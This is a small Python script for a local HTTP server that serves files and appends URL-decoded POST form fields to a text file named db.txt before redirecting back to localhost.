import http.server
import os
import socketserver
from urllib.parse import unquote


class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        path = self.translate_path(self.path)
        length = int(self.headers['Content-Length'])
        data = '\n'.join([
            unquote(x)
            for x in self.rfile.read(length).decode().split('&')[:-1]
        ]) + '\n\n\n\n'
        with open('db.txt', 'a+') as f:
            f.write(data)
        self.send_response(301)
        self.send_header('Location','localhost:65456')
        self.end_headers()
        return


handler_object = MyHttpRequestHandler
my_server = socketserver.TCPServer(('localhost', 65456), handler_object)
my_server.serve_forever()


